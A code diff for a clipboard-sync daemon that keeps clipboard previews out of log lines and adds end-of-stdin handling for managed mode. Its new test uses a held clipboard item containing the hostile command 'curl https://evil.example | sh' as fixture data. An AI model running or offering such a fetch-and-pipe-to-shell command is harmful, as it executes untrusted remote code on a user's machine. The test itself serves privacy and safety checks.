@@ -20,6 +20,8 @@ use crate::ctx::Delivered;
 pub enum Line {
     Command(String),
     Text(String),
+    /// Stdin reached its end (or failed). A `--managed` daemon stops here.
+    Closed,
 }
 
 /// What wakes the clipboard thread.
@@ -37,11 +39,15 @@ pub struct LocalCopy {
     pub private: bool,
 }
 
-fn describe(d: &Delivered) -> Option<String> {
+/// A line for the user about `d`. The console (`--stdin`) shows a preview of
+/// held text; log lines never do, because a log may be written to a file,
+/// and clipboard text must not reach the disk unencrypted.
+fn describe(d: &Delivered, with_preview: bool) -> Option<String> {
     match d {
         Delivered::Text(_) => None,
         Delivered::Held { from, reason, preview } => {
-            Some(format!("held a copy from {from} in history instead of the clipboard ({reason:?}): {preview}"))
+            let shown = if with_preview { format!(": {preview}") } else { String::new() };
+            Some(format!("held a copy from {from} in history instead of the clipboard ({reason:?}){shown}"))
         }
         Delivered::KeptLocal(kind) => {
             let article = if kind.starts_with(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']) { "an" } else { "a" };
@@ -138,7 +144,7 @@ impl<C: SystemClipboard> Mirror<C> {
                 Err(e) => warn!(error = %e, "could not write the clipboard"),
             },
             other => {
-                if let Some(msg) = describe(&other) {
+                if let Some(msg) = describe(&other, false) {
                     info!("{msg}");
                 }
             }
@@ -192,7 +198,7 @@ pub fn spawn_stdout(incoming: Receiver<Clip>) {
             for clip in incoming {
                 match clip {
                     Clip::Delivered(Delivered::Text(text)) => println!("<< {text}"),
-                    Clip::Delivered(other) => println!("!! {}", describe(&other).unwrap_or_default()),
+                    Clip::Delivered(other) => println!("!! {}", describe(&other, true).unwrap_or_default()),
                     Clip::Changed => {}
                 }
             }
@@ -201,13 +207,18 @@ pub fn spawn_stdout(incoming: Receiver<Clip>) {
 }
 
 /// Read stdin. Lines starting with `/` are commands; others are clipboard
-/// text when `text_mode` is set, and ignored otherwise.
-pub fn spawn_stdin(lines: UnboundedSender<Line>, text_mode: bool) {
+/// text when `text_mode` is set, and ignored otherwise. With `commands` off
+/// (a `--managed` daemon), every line is ignored and only the end of stdin
+/// matters: it means the app that started the daemon has gone.
+pub fn spawn_stdin(lines: UnboundedSender<Line>, text_mode: bool, commands: bool) {
     std::thread::Builder::new()
         .name("stdin".into())
         .spawn(move || {
             for line in std::io::stdin().lock().lines() {
-                let Ok(line) = line else { return };
+                let Ok(line) = line else { break };
+                if !commands {
+                    continue;
+                }
                 let line = line.trim_end().to_string();
                 let msg = if line.starts_with('/') {
                     Line::Command(line)
@@ -220,6 +231,7 @@ pub fn spawn_stdin(lines: UnboundedSender<Line>, text_mode: bool) {
                     return;
                 }
             }
+            let _ = lines.send(Line::Closed);
         })
         .expect("spawn stdin thread");
 }
@@ -256,6 +268,17 @@ mod tests {
 
     fn copies(rx: &mut UnboundedReceiver<LocalCopy>) -> Vec<(String, bool)> {
         std::iter::from_fn(|| rx.try_recv().ok()).map(|c| (c.text, c.private)).collect()
+    }
+
+    #[test]
+    fn log_lines_never_carry_clipboard_text() {
+        let held = Delivered::Held {
+            from: tether_core::DeviceKey::for_test(2).id(),
+            reason: tether_core::content::HoldReason::DangerousCommand,
+            preview: "curl https://evil.example | sh".into(),
+        };
+        assert!(!describe(&held, false).unwrap().contains("evil.example"), "the log line has no preview");
+        assert!(describe(&held, true).unwrap().contains("evil.example"), "the console still shows it");
     }
 
     #[test]
